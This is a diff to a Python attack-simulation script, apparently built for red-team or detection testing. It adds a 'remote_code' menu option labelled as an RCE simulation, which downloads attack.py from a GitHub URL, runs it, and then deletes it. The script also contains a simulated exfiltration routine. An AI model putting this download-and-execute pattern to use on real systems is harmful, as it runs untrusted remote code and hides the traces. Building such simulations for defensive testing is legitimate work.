@@ -653,35 +653,40 @@ def simulated_exfiltration(search_for_sensitive):
         os.remove(filename)
 
 #######################
-# .. 
-def anomaly_based_execution():
-    print("Anomaly-Based Script Execution starting...")
+# open a function to download and execute a remote script (currently set to download this same script - scriptception)
+def remote_code():
+    print("Script Execution (RCE Simulation) starting...")
     
-    # Your anomaly-based script execution code will go here.
-    # For instance, you could simulate executing a script that shouldn't typically run.
+    # URL of the remote script
+    remote_script_url = 'https://raw.githubusercontent.com/zorg-tech-industries/scripts/main/attack.py'
+    local_script_name = 'attack.py'
 
-    # Simulate executing a suspicious script
-    suspicious_script = 'suspicious_script.sh'  # Replace with your script's filename
-    
+    # Download the remote script
     try:
-        result = subprocess.run(['sh', suspicious_script], capture_output=True, text=True)
+        response = requests.get(remote_script_url)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        with open(local_script_name, 'w') as file:
+            file.write(response.text)
+        print(f"Downloaded script saved as {local_script_name}")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to download the script: {e}")
+        return
+
+    # Execute the downloaded script
+    try:
+        result = subprocess.run(['python', local_script_name], capture_output=True, text=True)
         print(f"Script executed with output: {result.stdout}")
     except subprocess.CalledProcessError as e:
         print(f"Script execution failed: {e.output}")
     except FileNotFoundError:
-        print(f"Script {suspicious_script} not found.")
-
-
-
-
-
-
-
-
+        print(f"Script {local_script_name} not found.")
+    finally:
+        # Clean up: remove the downloaded script after execution
+        if os.path.exists(local_script_name):
+            os.remove(local_script_name)
 
 ###########################################################################################################
 ###########################################################################################################
-
 def main_menu():
     hostList = []
     while True:
@@ -714,7 +719,7 @@ def main_menu():
         elif choice == '6':
             simulated_exfiltration(search_for_sensitive)
         elif choice == '7':
-            anomaly_based_execution()
+            remote_code()
         elif choice == '8' or choice.lower() == 'q':
             print("Exiting the program.")
             sys.exit()
